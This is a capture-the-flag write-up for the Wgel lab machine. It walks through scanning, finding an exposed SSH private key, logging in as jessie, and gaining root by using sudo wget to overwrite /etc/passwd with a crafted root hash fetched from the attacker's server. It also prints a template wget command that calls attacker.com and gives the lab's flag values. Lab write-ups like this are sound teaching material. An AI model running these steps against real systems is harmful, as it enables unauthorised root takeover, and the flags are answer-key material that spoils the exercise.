
---

## Wgel CTF

IP = `10.10.59.7`

### Nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Gobuster

`gobuster dir -u 10.10.59.7 -w /usr/share/dirb/wordlists/common.txt -o gobuster.txt`

```
/.hta                 (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 11374]
/server-status        (Status: 403) [Size: 275]
/sitemap              (Status: 301) [Size: 310] [--> http://10.10.59.7/sitemap/]
```

`gobuster dir -u 10.10.59.7/sitemap -w /usr/share/dirb/wordlists/common.txt -o gobuster.txt`

```
/.hta                 (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.ssh                 (Status: 301) [Size: 315] [--> http://10.10.59.7/sitemap/.ssh/]
/css                  (Status: 301) [Size: 314] [--> http://10.10.59.7/sitemap/css/]
/fonts                (Status: 301) [Size: 316] [--> http://10.10.59.7/sitemap/fonts/]
/images               (Status: 301) [Size: 317] [--> http://10.10.59.7/sitemap/images/]
/index.html           (Status: 200) [Size: 21080]
/js                   (Status: 301) [Size: 313] [--> http://10.10.59.7/sitemap/js/]
```

There is an `id_rsa`  file in `http://10.10.59.7/sitemap/.ssh/`

in `view-source:http://10.10.59.7/` we can find
```
--SNIP--
<!-- Jessie don't forget to udate the webiste -->
--SNIP--
```

##### Found Username

`Jessie`

we already have id_rsa, with these two we can login into ssh.

### Initial Foothold

```
# ssh -i id_rsa jessie@10.10.59.7
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~$
```

Got User!


**User_flag.txt**

from `/home/jessie/Documents` directory,

`057c67131c3d5e42dd5cd3075b198ff6`

### Privilege Escalation

`sudo -l`

```
jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```


with wget we can download and upload files.
with sudo privilege we can download and upload files in `/` directory.


```
jessie@CorpOne:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
--SNIP--
```

copy `/etc/passwd` to attackers machine.

Note:
```
crypt()_ and Encryption Algorithms[]

(https://www.baeldung.com/linux/shadow-passwords#3-crypt-and-encryption-algorithms)

There are many algorithms for encryption. Which one _/etc/shadow_ uses depends on several factors.

Usually, the default encryption algorithm can be read or defined via the _ENCRYPT_METHOD_ variable of [_/etc/login.defs_](https://man7.org/linux/man-pages/man5/login.defs.5.html). Alternatively, we can use the _pam_unix.so_ pluggable authentication module (PAM) and change the default hashing algorithm via _/etc/pam.d/common-password_.

Another consideration is the presence and version of [_glibc_](https://www.baeldung.com/linux/multiple-glibc). In fact, **[_crypt()_](http://man7.org/linux/man-pages/man3/crypt.3.html), as the main password encryption function, leverages _glibc_**. By default, it uses the insecure Data Encryption Standard (DES), but depending on the second argument, we can employ [many others](https://manpages.debian.org/testing/libcrypt-dev/crypt.5.en.html).

Essentially, the initial characters of the password field value in _/etc/shadow_ identify the encryption algorithm:

- _$1$_ is Message Digest 5 (MD5)
- _$2a$_ is _blowfish_
- _$5$_ is 256-bit Secure Hash Algorithm (SHA-256)
- _$6$_ is 512-bit Secure Hash Algorithm (SHA-512)
- _$y$_ (or _$7$_) is _yescrypt_
- none of the above means DES

Critically, as of this writing, **_yescrypt_ with its contest entry _yescrypt v2_ and [current specification](https://github.com/openwall/yescrypt/blob/main/README), is widely-adopted and the default password hashing scheme for many recent versions of major distributions** like Debian 11, Fedora 35+, Kali Linux 2021.1+, and Ubuntu 22.04+. Further, it’s supported on Fedora 29+ and RHEL 9+. Still, many standard tools still don’t support _yescrypt_.

In all cases except DES, the whole format of the field becomes more complex:

$id$param$salt$encrypted

Of these dollar-delimited subfields, we already explored _id_. The _param_ field can contain options for algorithms that support them.

Finally, a **[_salt_](https://www.baeldung.com/cs/simple-hashing-vs-salted-hashing#salted-hashing) in the password encryption context is a random supplemental value used when going through the process of hashing**. Its main idea is to introduce complexity beyond that of a regular human to reduce the odds of a successful cracking.
```

let's change the password of root to `password`
we can done encryption using https://www.dcode.fr/crypt-hashing-function.

![[crypt-function.png]]

output :
`$6$$bLTg4cpho8PIUrjfsE7qlU08Qx2UEfw..xOc6I1wpGVtyVYToGrr7BzRdAAnEr5lYFr1Z9WcCf1xNZ1HG9qFW1`

lets paste this hash into downloaded passwd file as

```
root:$6$$bLTg4cpho8PIUrjfsE7qlU08Qx2UEfw..xOc6I1wpGVtyVYToGrr7BzRdAAnEr5lYFr1Z9WcCf1xNZ1HG9qFW1:0:0:root:/root:/bin/bash
--SNIP--
```

Then, lets upload this into victim's machine

```
URL=http://attacker.com/file_to_get
LFILE=file_to_save
wget $URL -O $LFILE
```

```
jessie@CorpOne:~$ sudo wget http://10.6.101.54:8000/passwd -O /etc/passwd
--2024-08-14 07:45:09--  http://10.6.101.54:8000/passwd
Connecting to 10.6.101.54:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2383 (2,3K) [application/octet-stream]
Saving to: ‘/etc/passwd’

/etc/passwd             100%[==============================>]   2,33K  --.-KB/s    in 0s

2024-08-14 07:45:09 (6,31 MB/s) - ‘/etc/passwd’ saved [2383/2383]

jessie@CorpOne:~$
```

successfully downloaded into victim's machine.

```
jessie@CorpOne:~$ su root
Password:
root@CorpOne:/home/jessie#
```

Got Root!

**root_flag**

`b1b968b37519ad1daa6408188649263d`